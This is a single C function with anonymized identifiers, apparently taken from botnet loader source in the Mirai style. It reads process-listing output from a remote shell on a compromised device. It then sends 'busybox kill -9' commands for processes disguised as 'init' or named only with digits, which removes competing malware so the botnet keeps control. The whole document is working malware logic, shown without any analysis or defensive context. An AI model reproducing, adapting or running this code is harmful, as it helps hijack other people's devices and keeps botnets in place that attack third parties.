
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint8_t ;
struct connection {char* rdbuf; int rdbuf_pos; int fd; } ;
typedef scalar_t__ BOOL ;


 scalar_t__ VAR_0 ;
 char* VAR_1 ;
 scalar_t__ VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,char*,int) ;
 int FUNC_2 (char*,int,char*) ;
 scalar_t__ FUNC_3 (char*,char*) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (char*,int,char*,int) ;
 int FUNC_6 (int ,char*,int) ;

int FUNC_7(struct connection *VAR_3)
{
    int VAR_4;
    char *VAR_5 = VAR_3->rdbuf;
    int VAR_6, VAR_7;

    VAR_4 = FUNC_5(VAR_3->rdbuf, VAR_3->rdbuf_pos, VAR_1, FUNC_4(VAR_1));

    for (VAR_6 = 0; VAR_6 < (VAR_4 == -1 ? VAR_3->rdbuf_pos : VAR_4); VAR_6++)
    {
        if (VAR_3->rdbuf[VAR_6] == '\r')
            VAR_3->rdbuf[VAR_6] = 0;
        else if (VAR_3->rdbuf[VAR_6] == '\n')
        {
            uint8_t VAR_8 = 0;
            BOOL VAR_9 = VAR_0;
            char *VAR_10 = ((void*)0), *VAR_11 = ((void*)0);

            VAR_3->rdbuf[VAR_6] = 0;
            for (VAR_7 = 0; VAR_7 < ((char *)&VAR_3->rdbuf[VAR_6] - VAR_5); VAR_7++)
            {
                if (VAR_5[VAR_7] == ' ' || VAR_5[VAR_7] == '\t' || VAR_5[VAR_7] == 0)
                {
                    if (VAR_8 > 0 && !VAR_9)
                        VAR_8++;
                    VAR_5[VAR_7] = 0;
                    VAR_9 = VAR_2;
                }
                else
                {
                    if (VAR_8 == 0)
                    {
                        VAR_10 = &VAR_5[VAR_7];
                        VAR_8++;
                    }
                    else if (VAR_8 >= 3 && VAR_8 <= 5 && VAR_9)
                    {
                        VAR_11 = &VAR_5[VAR_7];
                    }
                    VAR_9 = VAR_0;
                }
            }

            if (VAR_10 != ((void*)0) && VAR_11 != ((void*)0))
            {
                int VAR_12 = FUNC_0(VAR_10);
                int VAR_13 = FUNC_4(VAR_11);





                if (VAR_12 != 1 && (FUNC_3(VAR_11, "init") == 0 || FUNC_3(VAR_11, "[init]") == 0))
                    FUNC_6(VAR_3->fd, "/bin/busybox kill -9 %d\r\n", VAR_12);
                else if (VAR_12 > 400)
                {
                    int VAR_14 = 0;
                    int VAR_15 = 0;

                    for (VAR_7 = 0; VAR_7 < VAR_13; VAR_7++)
                    {
                        if (VAR_11[VAR_7] >= '0' && VAR_11[VAR_7] <= '9')
                            VAR_14++;
                        else if ((VAR_11[VAR_7] >= 'a' && VAR_11[VAR_7] <= 'z') || (VAR_11[VAR_7] >= 'A' && VAR_11[VAR_7] <= 'Z'))
                        {
                            VAR_15++;
                            break;
                        }
                    }

                    if (VAR_15 == 0 && VAR_14 > 0)
                    {




                        FUNC_6(VAR_3->fd, "/bin/busybox kill -9 %d\r\n", VAR_12);
                    }
                }
            }

            VAR_5 = VAR_3->rdbuf + VAR_6 + 1;
        }
    }

    if (VAR_4 == -1)
    {
        if (VAR_3->rdbuf_pos > 7168)
        {
            FUNC_1(VAR_3->rdbuf, VAR_3->rdbuf + 6144, VAR_3->rdbuf_pos - 6144);
            VAR_3->rdbuf_pos -= 6144;
        }
        return 0;
    }
    else
    {
        for (VAR_6 = 0; VAR_6 < VAR_3->rdbuf_pos; VAR_6++)
        {
            if (VAR_3->rdbuf[VAR_6] == 0)
                VAR_3->rdbuf[VAR_6] = ' ';
        }
        return VAR_4;
    }
}
